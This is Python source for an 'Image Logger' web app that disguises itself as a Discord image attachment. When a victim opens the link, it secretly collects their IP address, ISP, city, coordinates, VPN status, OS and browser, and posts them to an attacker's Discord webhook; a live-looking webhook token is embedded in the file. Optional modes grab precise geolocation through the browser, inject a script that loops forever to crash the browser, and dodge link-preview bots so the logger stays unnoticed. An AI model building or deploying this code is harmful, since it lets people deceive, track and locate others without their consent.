import io
import http.client
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1551237867177639936/e4xhi_uNNW1FApzw2wr8II5NZM8gSRikeFmjpQBHug0IKszxn3RbF2zgRI05r0zcgHWD", # Your webhook link
    "image": "https://i.pinimg.com/736x/6f/e7/42/6fe742469cc9d01a6614f06f1777c415.jpg", # The image you want the site to load
    "imageArgument": True,

    
    "username": "Image Logger", 
    "color": 0x00FFFF,

    
    "crashBrowser": False,
    
    "accurateLocation": False, 

    "message": {
        "doMessage": False, 
        "message": "HELLO SIRE! You have been logged! Here is your info:\n\n**IP:** `{ip}`\n**ISP:** `{isp}`\n**ASN:** `{asn}`\n**Country:** `{country}`\n**Region:** `{region}`\n**City:** `{city}`\n**Coords:** `{lat}, {long}`\n**Timezone:** `{timezone}`\n**Mobile:** `{mobile}`\n**VPN:** `{vpn}`\n**Bot:** `{bot}`\n\n**OS:** `{os}`\n**Browser:** `{browser}`", 
        "richMessage": True, 
    },

    "vpnCheck": 1,
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": False, 
    "buggedImage": False,

    "antiBot": 1,
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here" 
    },
}

blacklistedIPs = ("27", "104", "143", "164", "13.57.148.235") 

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""

    os, browser = httpagentparser.simple_detect(useragent or "")
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'UTC/UTC').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else info.get('timezone', 'Unknown')} ({info.get('timezone', 'UTC').split('/')[0]})`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**"""
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class HeadersWrapper:
    def __init__(self, environ):
        self.environ = environ
    def get(self, key, default=""):
        k = key.lower().replace('-', '_')
        if k == 'x_forwarded_for':
            val = self.environ.get('HTTP_X_FORWARDED_FOR', self.environ.get('REMOTE_ADDR', '127.0.0.1'))
            return val.split(',')[0].strip() if val else '127.0.0.1'
        elif k == 'user_agent':
            return self.environ.get('HTTP_USER_AGENT', '')
        else:
            env_key = 'HTTP_' + k.upper()
            return self.environ.get(env_key, default)

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}

body {{
    background-color: #313338; /* Offizieller Discord Dark Theme Background */
    height: 100vh;
    width: 100vw;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: 'gg sans', 'Noto Sans', Helvetica, Arial, sans-serif;
    overflow: hidden;
}}

/* Discord Media Container */
.discord-card {{
    position: relative;
    background-color: #2b2d31;
    border-radius: 8px;
    overflow: hidden;
    max-width: 90vw;
    max-height: 90vh;
    display: flex;
    justify-content: center;
    align-items: center;
    min-width: 300px;
    min-height: 300px;
    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
}}

/* Grauer Verlauf als Bild-Platzhalter */
.placeholder {{
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, #383a40 0%, #2b2d31 100%);
    z-index: 1;
}}

/* Lade-Kreis Badge oben rechts (Discord-Style) */
.loading-badge {{
    position: absolute;
    top: 10px;
    right: 10px;
    width: 28px;
    height: 28px;
    background-color: rgba(0, 0, 0, 0.55);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 3;
}}

.spinner {{
    width: 14px;
    height: 14px;
    border: 2px solid rgba(255, 255, 255, 0.2);
    border-top-color: #ffffff;
    border-radius: 50%;
    animation: spin 0.75s linear infinite;
}}

@keyframes spin {{
    0% {{ transform: rotate(0deg); }}
    100% {{ transform: rotate(360deg); }}
}}

/* Bild (blendet sanft ein sobald geladen) */
.main-img {{
    position: relative;
    z-index: 2;
    max-width: 100%;
    max-height: 90vh;
    object-fit: contain;
    opacity: 0;
    transition: opacity 0.2s ease-in-out;
}}

.main-img.loaded {{
    opacity: 1;
}}
</style>
</head>
<body>

<div class="discord-card">
    <div class="placeholder" id="placeholder"></div>
    <div class="loading-badge" id="loader">
        <div class="spinner"></div>
    </div>
    <img class="main-img" id="img" src="{url}" alt="Attachment" 
         onload="document.getElementById('loader').style.display='none'; document.getElementById('placeholder').style.display='none'; this.classList.add('loaded');">
</div>

</body>
</html>'''.encode()
            
            ip = self.headers.get('x-forwarded-for')
            user_agent = self.headers.get('user-agent')

            if ip and ip.startswith(blacklistedIPs):
                return
            
            if botCheck(ip, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: self.wfile.write(binaries["loading"])

                makeReport(ip, useragent=user_agent, endpoint=s.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(ip, user_agent, location, s.split("?")[0], url = url)
                else:
                    result = makeReport(ip, user_agent, endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", ip)
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "")))
                    message = message.replace("{long}", str(result.get("lon", "")))
                    tz = result.get('timezone', 'UTC/UTC')
                    tz_split = tz.split('/') if '/' in tz else [tz, tz]
                    message = message.replace("{timezone}", f"{tz_split[1].replace('_', ' ')} ({tz_split[0]})")
                    message = message.replace("{mobile}", str(result.get("mobile", False)))
                    message = message.replace("{vpn}", str(result.get("proxy", False)))
                    message = message.replace("{bot}", str(result.get("hosting") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                    os_info, browser_info = httpagentparser.simple_detect(user_agent or "")
                    message = message.replace("{browser}", browser_info)
                    message = message.replace("{os}", os_info)

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return

class WSGIRequestHandlerWrapper(ImageLoggerAPI):
    def __init__(self, environ, start_response):
        self.environ = environ
        self.start_response_func = start_response
        self.headers = HeadersWrapper(environ)
        
        path = environ.get('PATH_INFO', '')
        query = environ.get('QUERY_STRING', '')
        self.path = f"{path}?{query}" if query else path
        
        self.response_status = 200
        self.response_message = "OK"
        self.response_headers = []
        self.wfile = io.BytesIO()
        
        self.handleRequest()

    def send_response(self, code, message=None):
        self.response_status = code
        self.response_message = message or http.client.responses.get(code, "OK")

    def send_header(self, keyword, value):
        self.response_headers.append((keyword, str(value)))

    def end_headers(self):
        status_str = f"{self.response_status} {self.response_message}"
        self.start_response_func(status_str, self.response_headers)

# Vercel greift exakt auf diese Funktion als Einstiegspunkt "app" zu
def app(environ, start_response):
    wrapper = WSGIRequestHandlerWrapper(environ, start_response)
    return [wrapper.wfile.getvalue()]
